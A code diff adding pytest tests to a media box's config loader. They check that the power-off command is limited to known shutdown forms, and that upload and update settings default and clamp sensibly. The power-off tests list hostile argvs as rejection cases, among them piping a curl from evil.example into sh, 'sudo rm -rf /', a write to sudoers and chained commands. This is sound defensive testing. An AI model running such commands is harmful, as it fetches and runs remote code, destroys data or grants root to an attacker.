@@ -249,6 +249,83 @@ def test_sleep_action_is_validated(tmp_path):
 
 
 # --------------------------------------------------------------------------
+# The power-off command
+#
+# This value is handed straight to subprocess.Popen by app.py, and the config
+# it comes from can be replaced from a dashboard that has no password. So the
+# rule lives here in the loader rather than in any one route: whatever way a
+# document reaches this function - hand edited on the box, uploaded, restored
+# from the backup, written back by an update - the argv that comes out the
+# other side is one of the handful this box is willing to run.
+# --------------------------------------------------------------------------
+def test_the_power_off_command_defaults_to_a_plain_sudo_poweroff(tmp_path):
+    assert _cfg(tmp_path).power_off_command == ("sudo", "poweroff")
+
+
+@pytest.mark.parametrize(
+    "written, expected",
+    [
+        ([], ()),                                        # "disabled" - tests use this
+        (["sudo", "poweroff"], ("sudo", "poweroff")),
+        ("sudo poweroff", ("sudo", "poweroff")),
+        (["poweroff"], ("poweroff",)),
+        (["sudo", "-n", "poweroff"], ("sudo", "-n", "poweroff")),
+        (["sudo", "systemctl", "poweroff"], ("sudo", "systemctl", "poweroff")),
+        (["sudo", "shutdown", "-h", "now"], ("sudo", "shutdown", "-h", "now")),
+        (["/sbin/poweroff"], ("/sbin/poweroff",)),
+        (["sudo", "/usr/sbin/poweroff"], ("sudo", "/usr/sbin/poweroff")),
+    ],
+)
+def test_the_ordinary_ways_to_switch_a_machine_off_are_all_kept(
+    tmp_path, written, expected
+):
+    assert _cfg(tmp_path, power_off_command=written).power_off_command == expected
+
+
+@pytest.mark.parametrize(
+    "hostile",
+    [
+        ["/bin/sh", "-c", "curl http://evil.example/x | sh"],
+        ["sh", "-c", "id > /tmp/pwned"],
+        ["bash", "-c", ":"],
+        ["python3", "-c", "import os; os.system('id')"],
+        ["sudo", "rm", "-rf", "/"],
+        ["sudo", "systemctl", "start", "evil.service"],
+        ["sudo", "tee", "/etc/sudoers.d/evil"],
+        ["poweroff; curl http://evil.example"],
+        "/bin/sh -c whoami",
+        ["sudo", "poweroff", "&&", "curl", "http://evil.example"],
+        ["/home/pi/uploads/payload.sh"],
+        ["sudo", "-n", "systemctl", "poweroff", "--", "extra"],
+    ],
+)
+def test_a_power_off_command_that_is_not_a_shutdown_never_reaches_the_box(
+    tmp_path, hostile
+):
+    """Anything that is not on the list is dropped, whatever it looks like.
+
+    Not fatal on purpose - see the loader. A box in somebody's living room
+    that refuses to boot cannot be rescued, so the value is thrown away and
+    the default is used instead. What must never happen is that argv reaching
+    subprocess.Popen.
+    """
+    cfg = _cfg(tmp_path, power_off_command=hostile)
+    assert cfg.power_off_command == ("sudo", "poweroff")
+    assert cfg.power_off_command_refused, "the box should record what it dropped"
+
+
+def test_a_refused_power_off_command_still_leaves_a_bootable_box(tmp_path):
+    # The whole config still loads: only the one value was thrown away.
+    cfg = _cfg(tmp_path, power_off_command=["/bin/sh", "-c", "id"])
+    assert cfg.channels, "a bad power_off_command must not cost the customer the TV"
+
+
+def test_a_good_power_off_command_is_not_flagged_as_refused(tmp_path):
+    assert _cfg(tmp_path, power_off_command=[]).power_off_command_refused is None
+    assert _cfg(tmp_path).power_off_command_refused is None
+
+
+# --------------------------------------------------------------------------
 # Bumpers and guide
 # --------------------------------------------------------------------------
 def test_bumpers_path_is_resolved(tmp_path):
@@ -276,3 +353,86 @@ def test_bumper_max_seconds_is_clamped(tmp_path):
 def test_guide_seconds_default_and_clamp(tmp_path):
     assert _cfg(tmp_path).guide_seconds == 8.0
     assert _cfg(tmp_path, guide_seconds=500).guide_seconds == 120.0
+
+
+# --------------------------------------------------------------------------
+# Dashboard upload limits
+# --------------------------------------------------------------------------
+def test_upload_limits_have_defaults(tmp_path):
+    cfg = _cfg(tmp_path)
+    assert cfg.web.max_upload_mb == 8192
+    assert cfg.web.min_free_mb == 1024
+
+
+def test_upload_limits_can_be_set(tmp_path):
+    cfg = _cfg(tmp_path, web={"max_upload_mb": 500, "min_free_mb": 200})
+    assert cfg.web.max_upload_mb == 500
+    assert cfg.web.min_free_mb == 200
+
+
+def test_upload_limits_are_clamped_to_something_sane(tmp_path):
+    # 0 free space required would let the dashboard fill the root filesystem,
+    # which is a bricked box; a 0 MB cap would make uploading impossible.
+    assert _cfg(tmp_path, web={"min_free_mb": 0}).web.min_free_mb == 64
+    assert _cfg(tmp_path, web={"max_upload_mb": 0}).web.max_upload_mb == 1
+
+
+def test_a_web_section_that_is_not_a_mapping_is_an_error(tmp_path):
+    with pytest.raises(ConfigError):
+        _cfg(tmp_path, web="yes please")
+
+
+def test_upload_session_limits_have_defaults(tmp_path):
+    web = _cfg(tmp_path).web
+    assert web.chunk_mb == 8
+    assert web.max_files_per_upload == 500
+    assert web.max_upload_sessions == 4
+    assert web.upload_expiry_hours == 24
+
+
+def test_upload_session_limits_can_be_set(tmp_path):
+    web = _cfg(tmp_path, web={
+        "chunk_mb": 2, "max_files_per_upload": 20,
+        "max_upload_sessions": 1, "upload_expiry_hours": 6,
+    }).web
+    assert (web.chunk_mb, web.max_files_per_upload) == (2, 20)
+    assert (web.max_upload_sessions, web.upload_expiry_hours) == (1, 6)
+
+
+def test_upload_session_limits_are_clamped(tmp_path):
+    # Zero of any of these makes uploading impossible rather than unlimited.
+    web = _cfg(tmp_path, web={
+        "chunk_mb": 0, "max_files_per_upload": 0,
+        "max_upload_sessions": 0, "upload_expiry_hours": 0,
+    }).web
+    assert web.chunk_mb == 1
+    assert web.max_files_per_upload == 1
+    assert web.max_upload_sessions == 1
+    assert web.upload_expiry_hours == 1
+
+
+# --------------------------------------------------------------------------
+# Updates
+# --------------------------------------------------------------------------
+def test_update_checking_is_on_and_applying_is_off_by_default(tmp_path):
+    updates = _cfg(tmp_path).updates
+    assert updates.check is True
+    assert updates.auto_apply is False, (
+        "a fleet that self-applies loses every unit to one bad tag at once"
+    )
+    assert updates.check_interval_hours == 24
+
+
+def test_update_checking_can_be_turned_off_entirely(tmp_path):
+    cfg = _cfg(tmp_path, updates={"check": False})
+    assert cfg.updates.check is False
+
+
+def test_update_settings_are_clamped(tmp_path):
+    assert _cfg(tmp_path, updates={"check_interval_hours": 0}).updates.check_interval_hours == 1
+    assert _cfg(tmp_path, updates={"check_interval_hours": 10**6}).updates.check_interval_hours == 720
+
+
+def test_an_updates_section_that_is_not_a_mapping_is_an_error(tmp_path):
+    with pytest.raises(ConfigError):
+        _cfg(tmp_path, updates="please")
